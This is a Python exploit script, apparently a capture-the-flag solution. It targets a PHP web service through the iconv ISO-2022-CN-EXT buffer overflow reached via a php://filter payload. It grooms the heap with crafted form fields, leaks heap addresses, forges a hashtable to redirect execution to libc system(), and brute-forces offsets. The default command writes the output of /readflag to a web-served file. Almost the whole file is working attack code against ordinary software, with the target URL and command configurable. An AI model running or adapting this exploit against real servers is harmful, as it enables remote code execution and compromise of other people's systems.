import struct
import requests
import json
import os
import random
import re
from tqdm import tqdm
from pwn import *


fengshui = {
    'overflow_1': 130,
    'overflow_2': 131,
    'victim_hashtable_1': 132,
    'victim_hashtable_2': 133,
    'victim_hashtable_3': 134,
    'victim_hashtable_4': 135,
    'victim_hashtable_5': 136,
    'victim_hashtable_6': 137,
    'victim_hashtable_7': 138,
    'victim_hashtable_8': 139,
    'victim_hashtable_9': 140,
    'victim_hashtable_10': 141,
}

for i in range(100):
    fengshui['pre_hole_' + str(i)] = 20 + i

fengshui_count = {
    k: 0 for k in fengshui.keys()
}

CHALLENGE_KEY = os.environ.get("KEY", "Up9}")


def make_payload(file_resource, submit):
    return [
        ('file', file_resource),
        ('key', CHALLENGE_KEY),
        ('submit', json.dumps(submit).replace('_REPLACE', '')),
    ]


def clear(_s, _key):
    fengshui_count[_key] += 1
    _s['Hold' + str(fengshui[_key]) + '_REPLACE' * fengshui_count[_key]] = ''

def set_val(_s, _key, _val): 
    fengshui_count[_key] += 1
    _s['Hold' + str(fengshui[_key]) + '_REPLACE' * fengshui_count[_key]] = _val

def pwn_leak(leak_type='zend'):
    exp = 'OVERFLOW'.ljust((0x2000-3), 'A') + "劄"
    exp = base64.b64encode(exp.encode()).decode()
    file_resource = f'php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=data:text/plain;base64,{exp}'

    submit = {}
    for i in range(8):
        submit['HOLD' + str(i)] = '!' * (0x2000 - 0x58)
    for i in range(4):
        submit['H0LD' + str(i)] = '@' * (0x3000 - 0x58)
    for i in range(256):
        if i == 15:
            submit['Hold' + str(i)] = 'C'.ljust(0x1000 - 0x58, 'S')
        else:
            submit['Hold' + str(i)] = '*' * (0x1000 - 0x58)

    # (4*2 + 32) * size, size is 2^n align
    # be aware that slot 320 and 640 will use 5 pages to init
    clear(submit, 'pre_hole_1')  # 88
    clear(submit, 'pre_hole_3')  # 90-91
    clear(submit, 'pre_hole_4') 
    clear(submit, 'pre_hole_6')  # 93-95
    clear(submit, 'pre_hole_7') 
    clear(submit, 'pre_hole_8') 
    clear(submit, 'pre_hole_10')  # 97-101
    clear(submit, 'pre_hole_11') 
    clear(submit, 'pre_hole_12') 
    clear(submit, 'pre_hole_13') 
    clear(submit, 'pre_hole_14') 
    clear(submit, 'pre_hole_16')  # 103-107
    clear(submit, 'pre_hole_17')  
    clear(submit, 'pre_hole_18')  
    clear(submit, 'pre_hole_19')  
    clear(submit, 'pre_hole_20')  
    clear(submit, 'victim_hashtable_1')  # 203-212
    clear(submit, 'victim_hashtable_2')
    clear(submit, 'victim_hashtable_3')
    clear(submit, 'victim_hashtable_4')
    clear(submit, 'victim_hashtable_5')
    clear(submit, 'victim_hashtable_6')
    clear(submit, 'victim_hashtable_7')
    clear(submit, 'victim_hashtable_8')
    clear(submit, 'victim_hashtable_9')
    clear(submit, 'victim_hashtable_10')
    freed_bucket = {}
    clear(submit, 'pre_hole_36') 
    clear(submit, 'pre_hole_37') 
    clear(submit, 'pre_hole_38') 
    clear(submit, 'pre_hole_39') 
    clear(submit, 'pre_hole_40') 
    clear(submit, 'pre_hole_41') 
    for i in range(1024 - 1):
        if i == 0x248:
            freed_bucket['Up9}'] = 'X' * (0x6000 - 0x58)   # 0x???????7d000
        else:
            freed_bucket['K' + str(i)] = '1'
    submit['freed_bucket'] = freed_bucket
    submit['freed_bucket_REPLACE'] = ''
    submit['hold_X'] = 'X' * (0x6000 - 0x58)  # 0x???????7d000, we can skip this
    submit['str_overwrite_freed_bucket'] = 'W' * (0x6900 - 0x18) + '\x08'
    submit['str_overwrite_freed_bucket_REPLACE'] = ''
    for i in range(256):
        submit['Inc' + str(i)] = ''
    
    clear(submit, 'pre_hole_24')
    clear(submit, 'pre_hole_25') 
    real_array = {}
    for i in range(128 - 1):
        real_array['R' + str(i)] = ''
    if leak_type == 'zend':
        real_array['R96'] = 'string-in-zend-heap-align-with-libc'
    elif leak_type == 'heap':
        real_array['R96'] = ''   # const in fpm heap
    submit['real_array'] = real_array  # 0x???????70000

    clear(submit, 'overflow_1')  # 201-202
    clear(submit, 'overflow_2')
    set_val(submit, 'overflow_1', 'O' * (0x2000 - 0x58))
    clear(submit, 'overflow_1') 
    
    clear(submit, 'pre_hole_50')  # 
    clear(submit, 'pre_hole_52')  # 
    clear(submit, 'pre_hole_54')  # 
    clear(submit, 'pre_hole_56')  #
    clear(submit, 'pre_hole_57') 

    submit['hold_key'] = ['Up9}' for _ in range(700)]
    submit['123'] = ''
    submit['Up9}'] = ''
    
    r = requests.post(URL, data=make_payload(file_resource, submit))
    return r.text


def pwn_write(arg0=0, pc=0):
    exp = 'OVERFLOW'.ljust((0x2000-3), 'A') + "劄"
    exp = base64.b64encode(exp.encode()).decode()
    file_resource = f'php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=data:text/plain;base64,{exp}'

    submit = {}
    for i in range(8):
        submit['HOLD' + str(i)] = '!' * (0x2000 - 0x58)
    for i in range(4):
        submit['H0LD' + str(i)] = '@' * (0x3000 - 0x58)
    for i in range(256):
        if i == 15:
            submit['Hold' + str(i)] = 'C'.ljust(0x1000 - 0x58, 'S')
        else:
            submit['Hold' + str(i)] = '*' * (0x1000 - 0x58)

    clear(submit, 'pre_hole_34')  # 109
    for i in range(74):  # the size of slot-56 is 73
        submit['s56-' + str(i)] = 'T' * (56 - 0x19)

    # (4*2 + 32) * size, size is 2^n align
    # be aware that slot 320 and 640 will use 5 pages to init
    clear(submit, 'pre_hole_1')  # 88
    clear(submit, 'pre_hole_3')  # 90-91
    clear(submit, 'pre_hole_4') 
    clear(submit, 'pre_hole_6')  # 93-95
    clear(submit, 'pre_hole_7') 
    clear(submit, 'pre_hole_8') 
    clear(submit, 'pre_hole_10')  # 97-101
    clear(submit, 'pre_hole_11') 
    clear(submit, 'pre_hole_12') 
    clear(submit, 'pre_hole_13') 
    clear(submit, 'pre_hole_14') 
    clear(submit, 'pre_hole_16')  # 103-107
    clear(submit, 'pre_hole_17')  
    clear(submit, 'pre_hole_18')  
    clear(submit, 'pre_hole_19')  
    clear(submit, 'pre_hole_20')  
    clear(submit, 'victim_hashtable_1')  # 203-212
    clear(submit, 'victim_hashtable_2')
    clear(submit, 'victim_hashtable_3')
    clear(submit, 'victim_hashtable_4')
    clear(submit, 'victim_hashtable_5')
    clear(submit, 'victim_hashtable_6')
    clear(submit, 'victim_hashtable_7')
    clear(submit, 'victim_hashtable_8')
    clear(submit, 'victim_hashtable_9')
    clear(submit, 'victim_hashtable_10')
    freed_bucket = {}
    for i in range(1024 - 1):
        if i == 0x248:
            freed_bucket['Up9}'] = {'a': ''}  # 0x???????7b000
        else:
            freed_bucket['K' + str(i)] = '1'
    submit['freed_bucket'] = freed_bucket
    submit['freed_bucket_REPLACE'] = ''
    submit['str_overwrite_freed_bucket'] = 'W' * (0x6900 - 0x18) + '\x18'
    submit['str_overwrite_freed_bucket_REPLACE'] = ''
    for i in range(256 - 74):
        submit['Inc' + str(i)] = ''
    
    clear(submit, 'pre_hole_22')
    
    clear(submit, 'pre_hole_25')
    clear(submit, 'pre_hole_26') 
    clear(submit, 'pre_hole_27') 
    fake_ht = [i for i in range(300 - 1)]
    fake_ht[0x01] = 0x0000000700000001
    fake_ht[0x02] = arg0
    fake_ht[0x04] = pc
    fake_ht[0x05] = [[0x1337]]
    submit['real_array'] = fake_ht  # 0x???????70000

    clear(submit, 'overflow_1')  # 201-202
    clear(submit, 'overflow_2')
    set_val(submit, 'overflow_1', 'O' * (0x2000 - 0x58))
    clear(submit, 'overflow_1') 
    
    clear(submit, 'pre_hole_50')  # 
    clear(submit, 'pre_hole_52')  # 
    clear(submit, 'pre_hole_54')  # 
    clear(submit, 'pre_hole_56')  #
    clear(submit, 'pre_hole_57') 

    submit['hold_key'] = ['Up9}' for _ in range(700)]
    submit['123'] = EXP
    submit['Up9}'] = ''
    
    try:
        requests.post(URL, data=make_payload(file_resource, submit), timeout=1)
    except requests.exceptions.Timeout:
        pass


def parse_html(html):
    start = html.find('<div id="result">') + len('<div id="result">')
    end = html.find('</div>', start)
    json_str = html[start:end]
    return json.loads(json_str)


def do_leak(leak_type='zend'):
    log.info('leak type: {}'.format(leak_type))
    res = pwn_leak(leak_type)
    res = parse_html(res)
    leak = res['real_array']['R96']
    leak = struct.unpack('<Q', struct.pack('<d', leak))[0]
    log.success('leak {}: {}'.format(leak_type, hex(leak)))
    return leak


def probe_offsets():
    yield from range(0, 0x300)
    yield from range(-1, -0x81, -1)


URL = os.environ.get("URL", "http://127.0.0.1:8082/").rstrip("/") + "/"
EXP = os.environ.get("EXP", "/readflag>1.php; #              ")


def main():
    near_fpm = do_leak('heap')
    zend_heap_main_chunk = do_leak('zend')

    zend_heap_main_chunk &= 0xffffffe00000  # 2mb align
    exp_str = zend_heap_main_chunk + 0x8b018
    near_libc = zend_heap_main_chunk + 0x200000
    log.info(f"Probing from {hex(near_libc)}")

    for i in tqdm(probe_offsets(), total=0x380):
        pwn_write(exp_str, near_libc + 0x1000 * i + 0x2fdcd70)  # libc_system
        try:
            res = requests.get(URL + '1.php', timeout=5)
        except requests.exceptions.RequestException:
            continue
        if res.status_code == 200 and res.text.strip():
            print(res.text.strip())
            break
    else:
        raise SystemExit(1)


if __name__ == '__main__':
    main()



# near_fpm &= 0xfffffff00000 
# for i in tqdm(range(0x100 * 4)):
#     pwn_write(near_fpm, pc=near_fpm - 0x100000 * i + 0xf81c0)  # zif_system
